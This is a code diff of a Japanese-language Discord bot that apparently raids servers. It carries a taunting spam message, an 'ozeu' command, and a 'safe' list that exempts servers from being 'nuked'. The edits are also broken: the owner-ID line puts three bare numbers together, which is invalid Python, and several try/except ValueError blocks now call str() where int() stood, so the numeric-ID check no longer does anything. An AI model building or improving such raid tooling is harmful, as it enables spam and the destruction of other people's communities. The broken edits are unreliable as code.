@@ -11,7 +11,7 @@ import platform
 
 load_dotenv()
 TOKEN = os.getenv("DISCORD_TOKEN")
-OWNER_ID = 1386539010381451356  # あなたのDiscord ID
+OWNER_ID = 1386539010381451356 1362090864968601943 1327285992293662732   # あなたのDiscord ID
 
 SPAM_MESSAGE = (
     "# バカどもがw とっととOzeu鯖入っとけw\n"
@@ -216,7 +216,7 @@ async def ozeu(ctx, guild_id: int = None):
 #---/sefeコマンド---
 @tree.command(name="safe", description="指定したサーバーIDを安全サーバーリストに追加し、nukeを発動禁止にします")
 @app_commands.describe(server_id="対象のサーバーID")
-async def safe(interaction: discord.Interaction, server_id: int):
+async def safe(interaction: discord.Interaction, server_id: str):
     safe_servers.add(server_id)
     save_safe_servers(safe_servers)
     await interaction.response.send_message(f"✅ サーバーID {server_id} を安全リストに追加しました。")
@@ -322,7 +322,7 @@ async def get_url(interaction: discord.Interaction, server_id: str):
         return
 
     try:
-        server_id_int = int(server_id)
+        server_id_int = str(server_id)
     except ValueError:
         await interaction.response.send_message("❌ 無効なサーバーIDです。数字のみを入力してください。", ephemeral=True)
         return
@@ -484,7 +484,7 @@ async def leave(interaction: discord.Interaction, server_id: str):
         return
 
     try:
-        server_id_int = int(server_id)
+        server_id_int = str(server_id)
     except ValueError:
         await interaction.response.send_message("❌ 無効なサーバーIDです。数字のみを入力してください。", ephemeral=True)
         return
